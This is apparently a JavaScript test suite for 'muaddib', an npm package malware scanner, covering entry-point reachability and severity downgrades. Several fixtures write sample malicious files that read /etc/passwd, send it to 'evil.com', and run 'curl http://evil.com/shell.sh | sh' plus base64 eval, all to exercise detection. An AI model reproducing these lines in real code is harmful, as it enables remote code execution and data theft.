const fs = require('fs');
const path = require('path');
const os = require('os');
const { test, asyncTest, assert, assertIncludes, runScanDirect } = require('../test-utils');
const { computeReachableFiles, getEntryPoints, extractExportsPaths, extractScriptJsFiles } = require('../../src/scanner/reachability');
const { applyFPReductions, isPackageLevelThreat, BENIGN_PACKAGE_WHITELIST, WHITELIST_EXEMPT_TYPES } = require('../../src/scoring');

function makeTmpDir() {
  return fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-reach-'));
}

function cleanup(dir) {
  fs.rmSync(dir, { recursive: true, force: true });
}

function writeFile(dir, rel, content) {
  const abs = path.join(dir, rel);
  fs.mkdirSync(path.dirname(abs), { recursive: true });
  fs.writeFileSync(abs, content);
}

async function runReachabilityTests() {
  console.log('\n=== Reachability Tests ===\n');

  // =========================================================================
  // extractExportsPaths
  // =========================================================================

  test('extractExportsPaths: string shorthand', () => {
    const paths = extractExportsPaths('./index.js');
    assert(paths.length === 1, `Expected 1 path, got ${paths.length}`);
    assert(paths[0] === './index.js', `Expected ./index.js, got ${paths[0]}`);
  });

  test('extractExportsPaths: object with condition keys', () => {
    const paths = extractExportsPaths({
      import: './esm/index.js',
      require: './cjs/index.js',
      default: './index.js'
    });
    assert(paths.length === 3, `Expected 3 paths, got ${paths.length}`);
    assert(paths.includes('./esm/index.js'), 'Should include esm path');
    assert(paths.includes('./cjs/index.js'), 'Should include cjs path');
    assert(paths.includes('./index.js'), 'Should include default path');
  });

  test('extractExportsPaths: nested conditional exports', () => {
    const paths = extractExportsPaths({
      '.': { import: './esm/index.js', require: './cjs/index.js' },
      './utils': { import: './esm/utils.js', require: './cjs/utils.js' }
    });
    assert(paths.length === 4, `Expected 4 paths, got ${paths.length}`);
    assert(paths.includes('./esm/index.js'), 'Should include esm/index');
    assert(paths.includes('./cjs/utils.js'), 'Should include cjs/utils');
  });

  test('extractExportsPaths: array form', () => {
    const paths = extractExportsPaths(['./a.js', './b.js']);
    assert(paths.length === 2, `Expected 2 paths, got ${paths.length}`);
    assert(paths.includes('./a.js'), 'Should include a.js');
    assert(paths.includes('./b.js'), 'Should include b.js');
  });

  test('extractExportsPaths: null/undefined returns empty', () => {
    assert(extractExportsPaths(null).length === 0, 'null should return empty');
    assert(extractExportsPaths(undefined).length === 0, 'undefined should return empty');
  });

  // =========================================================================
  // extractScriptJsFiles
  // =========================================================================

  test('extractScriptJsFiles: node scripts/install.js', () => {
    const files = extractScriptJsFiles('node scripts/install.js');
    assert(files.length === 1, `Expected 1 file, got ${files.length}`);
    assert(files[0] === 'scripts/install.js', `Expected scripts/install.js, got ${files[0]}`);
  });

  test('extractScriptJsFiles: node -e code has no match', () => {
    const files = extractScriptJsFiles('node -e "console.log(1)"');
    assert(files.length === 0, `Expected 0 files, got ${files.length}`);
  });

  test('extractScriptJsFiles: multiple js files', () => {
    const files = extractScriptJsFiles('node scripts/pre.js && node scripts/post.js');
    assert(files.length === 2, `Expected 2 files, got ${files.length}`);
    assert(files[0] === 'scripts/pre.js', 'First should be pre.js');
    assert(files[1] === 'scripts/post.js', 'Second should be post.js');
  });

  test('extractScriptJsFiles: mjs and cjs extensions', () => {
    const files = extractScriptJsFiles('node lib/setup.mjs && node lib/init.cjs');
    assert(files.length === 2, `Expected 2 files, got ${files.length}`);
    assert(files[0] === 'lib/setup.mjs', 'Should match .mjs');
    assert(files[1] === 'lib/init.cjs', 'Should match .cjs');
  });

  test('extractScriptJsFiles: null/empty returns empty', () => {
    assert(extractScriptJsFiles(null).length === 0, 'null returns empty');
    assert(extractScriptJsFiles('').length === 0, 'empty returns empty');
    assert(extractScriptJsFiles('echo hello').length === 0, 'non-node cmd returns empty');
  });

  // =========================================================================
  // getEntryPoints
  // =========================================================================

  test('getEntryPoints: main field', () => {
    const tmp = makeTmpDir();
    try {
      writeFile(tmp, 'package.json', JSON.stringify({ name: 'test', main: './lib/index.js' }));
      writeFile(tmp, 'lib/index.js', 'module.exports = {};');
      const eps = getEntryPoints(tmp);
      assert(eps.length === 1, `Expected 1 entry, got ${eps.length}`);
      assert(eps[0] === 'lib/index.js', `Expected lib/index.js, got ${eps[0]}`);
    } finally {
      cleanup(tmp);
    }
  });

  test('getEntryPoints: bin string', () => {
    const tmp = makeTmpDir();
    try {
      writeFile(tmp, 'package.json', JSON.stringify({ name: 'test', bin: './cli.js' }));
      writeFile(tmp, 'cli.js', '#!/usr/bin/env node\nconsole.log("hi");');
      const eps = getEntryPoints(tmp);
      assert(eps.length === 1, `Expected 1 entry, got ${eps.length}`);
      assert(eps[0] === 'cli.js', `Expected cli.js, got ${eps[0]}`);
    } finally {
      cleanup(tmp);
    }
  });

  test('getEntryPoints: bin object', () => {
    const tmp = makeTmpDir();
    try {
      writeFile(tmp, 'package.json', JSON.stringify({
        name: 'test',
        bin: { cmd1: './bin/cmd1.js', cmd2: './bin/cmd2.js' }
      }));
      writeFile(tmp, 'bin/cmd1.js', 'console.log("cmd1");');
      writeFile(tmp, 'bin/cmd2.js', 'console.log("cmd2");');
      const eps = getEntryPoints(tmp);
      assert(eps.length === 2, `Expected 2 entries, got ${eps.length}`);
      assert(eps.includes('bin/cmd1.js'), 'Should include bin/cmd1.js');
      assert(eps.includes('bin/cmd2.js'), 'Should include bin/cmd2.js');
    } finally {
      cleanup(tmp);
    }
  });

  test('getEntryPoints: exports string/object/nested', () => {
    const tmp = makeTmpDir();
    try {
      writeFile(tmp, 'package.json', JSON.stringify({
        name: 'test',
        exports: {
          '.': { import: './esm/index.js', require: './cjs/index.js' },
          './utils': './utils.js'
        }
      }));
      writeFile(tmp, 'esm/index.js', 'export default {};');
      writeFile(tmp, 'cjs/index.js', 'module.exports = {};');
      writeFile(tmp, 'utils.js', 'module.exports = {};');
      const eps = getEntryPoints(tmp);
      assert(eps.length === 3, `Expected 3 entries, got ${eps.length}`);
      assert(eps.includes('esm/index.js'), 'Should include esm/index.js');
      assert(eps.includes('cjs/index.js'), 'Should include cjs/index.js');
      assert(eps.includes('utils.js'), 'Should include utils.js');
    } finally {
      cleanup(tmp);
    }
  });

  test('getEntryPoints: browser and module fields', () => {
    const tmp = makeTmpDir();
    try {
      writeFile(tmp, 'package.json', JSON.stringify({
        name: 'test', browser: './browser.js', module: './esm.js'
      }));
      writeFile(tmp, 'browser.js', 'module.exports = {};');
      writeFile(tmp, 'esm.js', 'export default {};');
      const eps = getEntryPoints(tmp);
      assert(eps.length === 2, `Expected 2 entries, got ${eps.length}`);
      assert(eps.includes('browser.js'), 'Should include browser.js');
      assert(eps.includes('esm.js'), 'Should include esm.js');
    } finally {
      cleanup(tmp);
    }
  });

  test('getEntryPoints: default fallback to index.js', () => {
    const tmp = makeTmpDir();
    try {
      writeFile(tmp, 'package.json', JSON.stringify({ name: 'test' }));
      writeFile(tmp, 'index.js', 'module.exports = {};');
      const eps = getEntryPoints(tmp);
      assert(eps.length === 1, `Expected 1 entry (fallback), got ${eps.length}`);
      assert(eps[0] === 'index.js', `Expected index.js, got ${eps[0]}`);
    } finally {
      cleanup(tmp);
    }
  });

  test('getEntryPoints: no package.json returns empty', () => {
    const tmp = makeTmpDir();
    try {
      const eps = getEntryPoints(tmp);
      assert(eps.length === 0, `Expected 0 entries, got ${eps.length}`);
    } finally {
      cleanup(tmp);
    }
  });

  test('getEntryPoints: lifecycle script references', () => {
    const tmp = makeTmpDir();
    try {
      writeFile(tmp, 'package.json', JSON.stringify({
        name: 'test',
        scripts: { postinstall: 'node scripts/setup.js' }
      }));
      writeFile(tmp, 'scripts/setup.js', 'console.log("setup");');
      const eps = getEntryPoints(tmp);
      assert(eps.length === 1, `Expected 1 entry, got ${eps.length}`);
      assert(eps[0] === 'scripts/setup.js', `Expected scripts/setup.js, got ${eps[0]}`);
    } finally {
      cleanup(tmp);
    }
  });

  test('getEntryPoints: main with extension resolution', () => {
    const tmp = makeTmpDir();
    try {
      writeFile(tmp, 'package.json', JSON.stringify({ name: 'test', main: './lib/main' }));
      writeFile(tmp, 'lib/main.js', 'module.exports = {};');
      const eps = getEntryPoints(tmp);
      assert(eps.length === 1, `Expected 1 entry, got ${eps.length}`);
      assert(eps[0] === 'lib/main.js', `Expected lib/main.js, got ${eps[0]}`);
    } finally {
      cleanup(tmp);
    }
  });

  test('getEntryPoints: main with index.js directory resolution', () => {
    const tmp = makeTmpDir();
    try {
      writeFile(tmp, 'package.json', JSON.stringify({ name: 'test', main: './lib' }));
      writeFile(tmp, 'lib/index.js', 'module.exports = {};');
      const eps = getEntryPoints(tmp);
      assert(eps.length === 1, `Expected 1 entry, got ${eps.length}`);
      assert(eps[0] === 'lib/index.js', `Expected lib/index.js, got ${eps[0]}`);
    } finally {
      cleanup(tmp);
    }
  });

  // =========================================================================
  // computeReachableFiles
  // =========================================================================

  test('computeReachableFiles: main -> utils -> helper chain', () => {
    const tmp = makeTmpDir();
    try {
      writeFile(tmp, 'package.json', JSON.stringify({ name: 'test', main: './src/index.js' }));
      writeFile(tmp, 'src/index.js', "const utils = require('./utils');\nconsole.log(utils);");
      writeFile(tmp, 'src/utils.js', "const helper = require('./helper');\nmodule.exports = helper;");
      writeFile(tmp, 'src/helper.js', 'module.exports = { help: true };');
      writeFile(tmp, 'test/test.js', "const idx = require('../src/index');\nconsole.log('test');");

      const result = computeReachableFiles(tmp);
      assert(!result.skipped, 'Should not be skipped');
      assert(result.reachableFiles.has('src/index.js'), 'src/index.js should be reachable');
      assert(result.reachableFiles.has('src/utils.js'), 'src/utils.js should be reachable');
      assert(result.reachableFiles.has('src/helper.js'), 'src/helper.js should be reachable');
      assert(!result.reachableFiles.has('test/test.js'), 'test/test.js should NOT be reachable');
    } finally {
      cleanup(tmp);
    }
  });

  test('computeReachableFiles: no entry points -> skipped', () => {
    const tmp = makeTmpDir();
    try {
      writeFile(tmp, 'package.json', JSON.stringify({ name: 'test' }));
      // No index.js either
      const result = computeReachableFiles(tmp);
      assert(result.skipped === true, 'Should be skipped when no entry points');
      assert(result.reachableFiles.size === 0, 'Reachable set should be empty');
    } finally {
      cleanup(tmp);
    }
  });

  test('computeReachableFiles: parse error in file is still reachable (fail-safe)', () => {
    const tmp = makeTmpDir();
    try {
      writeFile(tmp, 'package.json', JSON.stringify({ name: 'test', main: './index.js' }));
      writeFile(tmp, 'index.js', "const bad = require('./broken');\nconsole.log(bad);");
      writeFile(tmp, 'broken.js', '{{{{invalid javascript!!!!');

      const result = computeReachableFiles(tmp);
      assert(!result.skipped, 'Should not be skipped');
      assert(result.reachableFiles.has('index.js'), 'index.js should be reachable');
      assert(result.reachableFiles.has('broken.js'), 'broken.js should be reachable (discovered via import)');
    } finally {
      cleanup(tmp);
    }
  });

  test('computeReachableFiles: circular imports - no infinite loop', () => {
    const tmp = makeTmpDir();
    try {
      writeFile(tmp, 'package.json', JSON.stringify({ name: 'test', main: './a.js' }));
      writeFile(tmp, 'a.js', "const b = require('./b');\nmodule.exports = { a: true };");
      writeFile(tmp, 'b.js', "const a = require('./a');\nmodule.exports = { b: true };");

      const result = computeReachableFiles(tmp);
      assert(!result.skipped, 'Should not be skipped');
      assert(result.reachableFiles.has('a.js'), 'a.js should be reachable');
      assert(result.reachableFiles.has('b.js'), 'b.js should be reachable');
      assert(result.reachableFiles.size === 2, 'Should have exactly 2 reachable files');
    } finally {
      cleanup(tmp);
    }
  });

  test('computeReachableFiles: follows spawn(node, [path.join(__dirname, file)])', () => {
    const tmp = makeTmpDir();
    try {
      writeFile(tmp, 'package.json', JSON.stringify({
        name: 'test', scripts: { postinstall: 'node launcher.js' }
      }));
      writeFile(tmp, 'launcher.js', `
        const { spawn } = require('child_process');
        const path = require('path');
        const worker = spawn('node', [path.join(__dirname, 'worker.js')], { detached: true, stdio: 'ignore' });
        worker.unref();
      `);
      writeFile(tmp, 'worker.js', `
        const fs = require('fs');
        const https = require('https');
        const data = fs.readFileSync('/etc/passwd');
        https.request({ hostname: 'evil.com' });
      `);

      const result = computeReachableFiles(tmp);
      assert(!result.skipped, 'Should not be skipped');
      assert(result.reachableFiles.has('launcher.js'), 'launcher.js should be reachable');
      assert(result.reachableFiles.has('worker.js'), 'worker.js should be reachable (via spawn)');
    } finally {
      cleanup(tmp);
    }
  });

  test('computeReachableFiles: follows spawn(process.execPath, [path.join(__dirname, file)])', () => {
    const tmp = makeTmpDir();
    try {
      writeFile(tmp, 'package.json', JSON.stringify({
        name: 'test', scripts: { preinstall: 'node bootstrap.js' }
      }));
      writeFile(tmp, 'bootstrap.js', `
        const { spawn } = require('child_process');
        const path = require('path');
        spawn(process.execPath, [path.join(__dirname, 'stealer.js')], { detached: true, stdio: 'ignore' });
      `);
      writeFile(tmp, 'stealer.js', 'const fs = require("fs"); fs.readFileSync("/etc/passwd");');

      const result = computeReachableFiles(tmp);
      assert(result.reachableFiles.has('bootstrap.js'), 'bootstrap.js should be reachable');
      assert(result.reachableFiles.has('stealer.js'), 'stealer.js should be reachable (via spawn)');
    } finally {
      cleanup(tmp);
    }
  });

  test('computeReachableFiles: follows fork(path)', () => {
    const tmp = makeTmpDir();
    try {
      writeFile(tmp, 'package.json', JSON.stringify({ name: 'test', main: './index.js' }));
      writeFile(tmp, 'index.js', `
        const { fork } = require('child_process');
        fork('./worker.js');
      `);
      writeFile(tmp, 'worker.js', 'process.send({ done: true });');

      const result = computeReachableFiles(tmp);
      assert(result.reachableFiles.has('index.js'), 'index.js should be reachable');
      assert(result.reachableFiles.has('worker.js'), 'worker.js should be reachable (via fork)');
    } finally {
      cleanup(tmp);
    }
  });

  test('computeReachableFiles: bin entries as entry points', () => {
    const tmp = makeTmpDir();
    try {
      writeFile(tmp, 'package.json', JSON.stringify({
        name: 'test', bin: { cli: './bin/cli.js' }
      }));
      writeFile(tmp, 'bin/cli.js', "const lib = require('../lib/main');\ncli();");
      writeFile(tmp, 'lib/main.js', 'module.exports = {};');
      writeFile(tmp, 'examples/demo.js', 'console.log("demo");');

      const result = computeReachableFiles(tmp);
      assert(!result.skipped, 'Should not be skipped');
      assert(result.reachableFiles.has('bin/cli.js'), 'bin/cli.js should be reachable');
      assert(result.reachableFiles.has('lib/main.js'), 'lib/main.js should be reachable');
      assert(!result.reachableFiles.has('examples/demo.js'), 'examples/demo.js should NOT be reachable');
    } finally {
      cleanup(tmp);
    }
  });

  test('computeReachableFiles: multiple exports paths as seeds', () => {
    const tmp = makeTmpDir();
    try {
      writeFile(tmp, 'package.json', JSON.stringify({
        name: 'test',
        exports: { '.': './src/main.js', './utils': './src/utils.js' }
      }));
      writeFile(tmp, 'src/main.js', 'module.exports = {};');
      writeFile(tmp, 'src/utils.js', "const h = require('./helper');\nmodule.exports = h;");
      writeFile(tmp, 'src/helper.js', 'module.exports = {};');
      writeFile(tmp, 'test/spec.js', 'console.log("spec");');

      const result = computeReachableFiles(tmp);
      assert(!result.skipped, 'Should not be skipped');
      assert(result.entryPoints.length === 2, `Expected 2 entry points, got ${result.entryPoints.length}`);
      assert(result.reachableFiles.has('src/main.js'), 'src/main.js should be reachable');
      assert(result.reachableFiles.has('src/utils.js'), 'src/utils.js should be reachable');
      assert(result.reachableFiles.has('src/helper.js'), 'src/helper.js should be reachable');
      assert(!result.reachableFiles.has('test/spec.js'), 'test/spec.js should NOT be reachable');
    } finally {
      cleanup(tmp);
    }
  });

  // =========================================================================
  // Integration: applyFPReductions with reachableFiles
  // =========================================================================

  test('scoring: unreachable file threats downgraded to LOW', () => {
    const reachable = new Set(['src/index.js']);
    const threats = [
      { type: 'suspicious_dataflow', severity: 'HIGH', file: 'test/helper.js', message: 'test' },
      { type: 'obfuscation_detected', severity: 'MEDIUM', file: 'examples/demo.js', message: 'test' }
    ];
    applyFPReductions(threats, reachable);
    assert(threats[0].severity === 'LOW', `Expected LOW, got ${threats[0].severity}`);
    assert(threats[0].unreachable === true, 'Should be marked unreachable');
    assert(threats[1].severity === 'LOW', `Expected LOW, got ${threats[1].severity}`);
    assert(threats[1].unreachable === true, 'Should be marked unreachable');
  });

  test('scoring: reachable file threats keep original severity', () => {
    const reachable = new Set(['src/index.js']);
    const threats = [
      { type: 'suspicious_dataflow', severity: 'HIGH', file: 'src/index.js', message: 'test' }
    ];
    applyFPReductions(threats, reachable);
    assert(threats[0].severity === 'HIGH', `Expected HIGH, got ${threats[0].severity}`);
    assert(!threats[0].unreachable, 'Should NOT be marked unreachable');
  });

  test('scoring: null reachableFiles skips downgrade (backward compat)', () => {
    const threats = [
      { type: 'suspicious_dataflow', severity: 'HIGH', file: 'test/helper.js', message: 'test' }
    ];
    applyFPReductions(threats, null);
    assert(threats[0].severity === 'HIGH', `Expected HIGH unchanged, got ${threats[0].severity}`);
  });

  test('scoring: empty reachableFiles set skips downgrade', () => {
    const threats = [
      { type: 'suspicious_dataflow', severity: 'HIGH', file: 'test/helper.js', message: 'test' }
    ];
    applyFPReductions(threats, new Set());
    assert(threats[0].severity === 'HIGH', `Expected HIGH unchanged, got ${threats[0].severity}`);
  });

  test('scoring: exempt types NOT downgraded in unreachable files', () => {
    const reachable = new Set(['src/index.js']);
    const threats = [
      { type: 'ioc_match', severity: 'CRITICAL', file: 'test/malware.js', message: 'IOC hit' },
      { type: 'lifecycle_script', severity: 'HIGH', file: 'package.json', message: 'preinstall' },
      { type: 'typosquat_detected', severity: 'HIGH', file: 'package.json', message: 'typosquat' },
      { type: 'cross_file_dataflow', severity: 'CRITICAL', file: 'test/flow.js', message: 'cross-file' }
    ];
    applyFPReductions(threats, reachable);
    assert(threats[0].severity === 'CRITICAL', `ioc_match should stay CRITICAL, got ${threats[0].severity}`);
    assert(threats[1].severity === 'HIGH', `lifecycle_script should stay HIGH, got ${threats[1].severity}`);
    assert(threats[2].severity === 'HIGH', `typosquat should stay HIGH, got ${threats[2].severity}`);
    assert(threats[3].severity === 'CRITICAL', `cross_file_dataflow should stay CRITICAL, got ${threats[3].severity}`);
  });

  test('scoring: ai_config_injection NOT downgraded in unreachable files', () => {
    const reachable = new Set(['src/index.js']);
    const threats = [
      { type: 'ai_config_injection', severity: 'HIGH', file: 'CLAUDE.md', message: 'prompt injection' },
      { type: 'ai_config_injection_compound', severity: 'CRITICAL', file: '.cursorrules', message: 'compound injection' }
    ];
    applyFPReductions(threats, reachable);
    assert(threats[0].severity === 'HIGH', `ai_config_injection should stay HIGH, got ${threats[0].severity}`);
    assert(threats[1].severity === 'CRITICAL', `ai_config_injection_compound should stay CRITICAL, got ${threats[1].severity}`);
  });

  test('scoring: package-level threats NOT downgraded even in unreachable files', () => {
    const reachable = new Set(['src/index.js']);
    const threats = [
      { type: 'known_malicious_package', severity: 'CRITICAL', file: 'node_modules/bad/index.js', message: 'malicious' }
    ];
    applyFPReductions(threats, reachable);
    assert(threats[0].severity === 'CRITICAL', `Package-level threat should stay CRITICAL, got ${threats[0].severity}`);
  });

  test('scoring: windows backslash paths normalized for reachability check', () => {
    const reachable = new Set(['src/index.js']);
    const threats = [
      { type: 'dangerous_call_function', severity: 'MEDIUM', file: 'test\\helper.js', message: 'eval' }
    ];
    applyFPReductions(threats, reachable);
    assert(threats[0].severity === 'LOW', `Backslash path should be normalized and downgraded, got ${threats[0].severity}`);
    assert(threats[0].unreachable === true, 'Should be marked unreachable');
  });

  // =========================================================================
  // Integration: runScanDirect with reachability
  // =========================================================================

  await asyncTest('integration: unreachable file findings downgraded in scan', async () => {
    const tmp = makeTmpDir();
    try {
      writeFile(tmp, 'package.json', JSON.stringify({ name: 'test-reach', main: './src/index.js' }));
      writeFile(tmp, 'src/index.js', 'module.exports = { safe: true };');
      // Unreachable test file with suspicious code
      writeFile(tmp, 'test/evil.js', `
        const cp = require('child_process');
        const http = require('http');
        const fs = require('fs');
        const secret = fs.readFileSync('/etc/passwd', 'utf8');
        http.request({ hostname: 'evil.com', path: '/' + secret });
        cp.execSync('curl http://evil.com/shell.sh | sh');
        eval(Buffer.from('Y29uc29sZS5sb2coImhhY2tlZCIp', 'base64').toString());
      `);

      const result = await runScanDirect(tmp, { _capture: true });
      // All file-level findings in test/evil.js should be LOW (unreachable)
      const testFindings = result.threats.filter(t => t.file && t.file.includes('test'));
      for (const t of testFindings) {
        if (!isPackageLevelThreat(t) && t.type !== 'cross_file_dataflow') {
          assert(t.severity === 'LOW',
            `Unreachable finding ${t.type} in ${t.file} should be LOW, got ${t.severity}`);
        }
      }
    } finally {
      cleanup(tmp);
    }
  });

  await asyncTest('integration: reachable file findings keep severity', async () => {
    const tmp = makeTmpDir();
    try {
      writeFile(tmp, 'package.json', JSON.stringify({ name: 'test-reach2', main: './index.js' }));
      // Reachable file with suspicious code
      writeFile(tmp, 'index.js', `
        const cp = require('child_process');
        const http = require('http');
        const fs = require('fs');
        const secret = fs.readFileSync('/etc/passwd', 'utf8');
        http.request({ hostname: 'evil.com', path: '/' + secret });
        cp.execSync('curl http://evil.com/shell.sh | sh');
        eval(Buffer.from('Y29uc29sZS5sb2coImhhY2tlZCIp', 'base64').toString());
      `);

      const result = await runScanDirect(tmp, { _capture: true });
      const mainFindings = result.threats.filter(t => t.file === 'index.js');
      // At least some findings should be above LOW
      const hasHighSev = mainFindings.some(t => t.severity !== 'LOW');
      assert(hasHighSev, 'Reachable file should have findings above LOW severity');
    } finally {
      cleanup(tmp);
    }
  });

  await asyncTest('integration: --no-reachability disables downgrade', async () => {
    const tmp = makeTmpDir();
    try {
      writeFile(tmp, 'package.json', JSON.stringify({ name: 'test-no-reach', main: './src/index.js' }));
      writeFile(tmp, 'src/index.js', 'module.exports = {};');
      writeFile(tmp, 'test/evil.js', `
        const cp = require('child_process');
        cp.execSync('curl http://evil.com | sh');
        eval(Buffer.from('Y29uc29sZS5sb2coImhhY2tlZCIp', 'base64').toString());
      `);

      const withReach = await runScanDirect(tmp, { _capture: true });
      const withoutReach = await runScanDirect(tmp, { _capture: true, noReachability: true });

      const unreachFindings = withReach.threats.filter(
        t => t.file && t.file.includes('test') && !isPackageLevelThreat(t) && t.type !== 'cross_file_dataflow'
      );
      const noReachFindings = withoutReach.threats.filter(
        t => t.file && t.file.includes('test') && !isPackageLevelThreat(t) && t.type !== 'cross_file_dataflow'
      );

      // With reachability: all should be LOW
      for (const t of unreachFindings) {
        assert(t.severity === 'LOW',
          `With reachability: ${t.type} should be LOW, got ${t.severity}`);
      }
      // Without reachability: at least some should be above LOW
      if (noReachFindings.length > 0) {
        const hasHighSev = noReachFindings.some(t => t.severity !== 'LOW');
        assert(hasHighSev, 'Without reachability: should have findings above LOW');
      }
    } finally {
      cleanup(tmp);
    }
  });
  // =========================================================================
  // Benign Package Whitelist (v2.3.5)
  // =========================================================================

  test('benign whitelist: contains expected packages', () => {
    for (const pkg of ['meteor', 'blessed', 'sharp', 'forever', 'start-server-and-test']) {
      assert(BENIGN_PACKAGE_WHITELIST.has(pkg), `${pkg} should be in BENIGN_PACKAGE_WHITELIST`);
    }
  });

  test('benign whitelist: downgrades non-IOC threats to LOW', () => {
    const threats = [
      { type: 'dangerous_exec', severity: 'CRITICAL', file: 'install.js', message: 'powershell' },
      { type: 'lifecycle_script', severity: 'MEDIUM', file: 'package.json', message: 'install' },
      { type: 'dynamic_require', severity: 'HIGH', file: 'lib/main.js', message: 'dynamic' }
    ];
    applyFPReductions(threats, null, 'meteor');
    assert(threats[0].severity === 'LOW', `dangerous_exec should be LOW for meteor, got ${threats[0].severity}`);
    assert(threats[1].severity === 'LOW', `lifecycle_script should be LOW for meteor, got ${threats[1].severity}`);
    assert(threats[2].severity === 'LOW', `dynamic_require should be LOW for meteor, got ${threats[2].severity}`);
  });

  test('benign whitelist: preserves IOC match severity', () => {
    const threats = [
      { type: 'known_malicious_package', severity: 'CRITICAL', file: 'package.json', message: 'malicious' },
      { type: 'ioc_match', severity: 'CRITICAL', file: 'index.js', message: 'IOC' },
      { type: 'lifecycle_shell_pipe', severity: 'CRITICAL', file: 'package.json', message: 'curl|sh' },
      { type: 'cross_file_dataflow', severity: 'CRITICAL', file: 'lib/a.js', message: 'flow' }
    ];
    applyFPReductions(threats, null, 'blessed');
    for (const t of threats) {
      assert(t.severity === 'CRITICAL', `${t.type} should stay CRITICAL for whitelisted package, got ${t.severity}`);
    }
  });

  test('benign whitelist: no effect on non-whitelisted packages', () => {
    const threats = [
      { type: 'dangerous_exec', severity: 'CRITICAL', file: 'install.js', message: 'powershell' },
      { type: 'module_compile', severity: 'CRITICAL', file: 'lib/main.js', message: '_compile' }
    ];
    applyFPReductions(threats, null, 'unknown-package');
    assert(threats[0].severity === 'CRITICAL', `Should stay CRITICAL for non-whitelisted, got ${threats[0].severity}`);
    assert(threats[1].severity === 'CRITICAL', `Should stay CRITICAL for non-whitelisted, got ${threats[1].severity}`);
  });

  test('benign whitelist: no effect when packageName is null', () => {
    const threats = [
      { type: 'dangerous_exec', severity: 'CRITICAL', file: 'install.js', message: 'test' }
    ];
    applyFPReductions(threats, null, null);
    assert(threats[0].severity === 'CRITICAL', `Should stay CRITICAL when no packageName, got ${threats[0].severity}`);
  });

  test('benign whitelist: all 5 packages downgrade correctly', () => {
    for (const pkg of ['meteor', 'blessed', 'sharp', 'forever', 'start-server-and-test']) {
      const threats = [
        { type: 'module_compile', severity: 'CRITICAL', file: 'lib/main.js', message: '_compile' },
        { type: 'suspicious_dataflow', severity: 'HIGH', file: 'lib/index.js', message: 'flow' }
      ];
      applyFPReductions(threats, null, pkg);
      assert(threats[0].severity === 'LOW', `${pkg}: module_compile should be LOW, got ${threats[0].severity}`);
      assert(threats[1].severity === 'LOW', `${pkg}: suspicious_dataflow should be LOW, got ${threats[1].severity}`);
    }
  });

  await asyncTest('integration: benign package whitelist applied in scan', async () => {
    const tmp = makeTmpDir();
    try {
      writeFile(tmp, 'package.json', JSON.stringify({ name: 'sharp', main: './index.js' }));
      writeFile(tmp, 'index.js', `
        const path = require('path');
        const mod = require(path.join(__dirname, 'lib', 'sharp.js'));
      `);

      const result = await runScanDirect(tmp, { _capture: true });
      // sharp is whitelisted, so score should be very low
      assert(result.summary.riskScore < 20,
        `Whitelisted package 'sharp' should have score < 20, got ${result.summary.riskScore}`);
    } finally {
      cleanup(tmp);
    }
  });
}

module.exports = { runReachabilityTests };
